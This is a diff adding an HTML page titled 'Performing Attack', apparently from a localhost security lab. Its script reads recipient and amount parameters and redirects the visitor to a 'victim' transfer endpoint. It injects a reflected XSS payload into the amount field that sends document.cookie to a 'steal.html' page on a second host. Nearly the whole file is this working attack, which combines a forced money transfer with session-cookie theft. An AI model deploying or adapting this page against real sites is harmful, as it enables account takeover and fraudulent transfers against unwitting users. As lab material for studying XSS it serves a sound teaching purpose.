@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Performing Attack</title>
+</head>
+<body>
+    <h1>Performing Attack</h1>
+    <p>Redirecting to the victim's site to perform the transfer...</p>
+    
+    <script>
+        // Extract parameters from the URL
+        const params = new URLSearchParams(window.location.search);
+        const recipient = params.get('recipient');
+        const amount = params.get('amount');
+
+        // Construct the malicious URL with XSS payload
+        const victimURL = `http://localhost:8000/transfer?recipient=${recipient}&amount=<script>document.location='http://localhost:9000/steal.html?cookie='+document.cookie</script>`;
+
+        // Redirect the browser to the malicious URL
+        document.location = victimURL;
+    </script>
+</body>
+</html>
